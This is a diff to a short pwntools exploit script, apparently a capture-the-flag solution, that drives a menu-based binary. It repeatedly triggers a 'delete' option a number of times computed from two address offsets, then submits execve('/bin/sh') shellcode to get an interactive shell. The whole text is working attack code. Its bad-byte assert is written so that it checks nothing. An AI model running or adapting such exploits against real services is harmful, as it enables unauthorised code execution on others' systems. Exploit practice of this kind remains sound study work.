@@ -6,6 +6,8 @@ from pwn import *
 from time import sleep
 import sys
 context.log_level = "debug"
+context.os = "linux"
+context.arch = "amd64"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == "l":
@@ -22,15 +24,22 @@ def DEBUG():
     raw_input("DEBUG: ")
     gdb.attach(io)
 
+def delete():
+    io.sendlineafter("choice:\n", "2")
+
+def new(payload):
+    io.sendlineafter("choice:\n", "0")
+    io.sendlineafter("characters\n", payload)
 
 if __name__ == "__main__":
     shellcode = asm(shellcraft.execve("/bin/sh"))
-    for i in xrange(14):
-        io.sendlineafter("choice:\n", "2")
+    assert False in ('\x00', '\x10', '\x90' in shellcode)
 
-    io.sendlineafter("choice:\n", "0")
-    io.sendlineafter("characters\n", shellcode)
-    
+    for i in xrange((0x2020c0 - 0x202028) / 8 + 1):
+        delete()
+
+    new(shellcode)
+
     io.interactive()
     io.close()
 
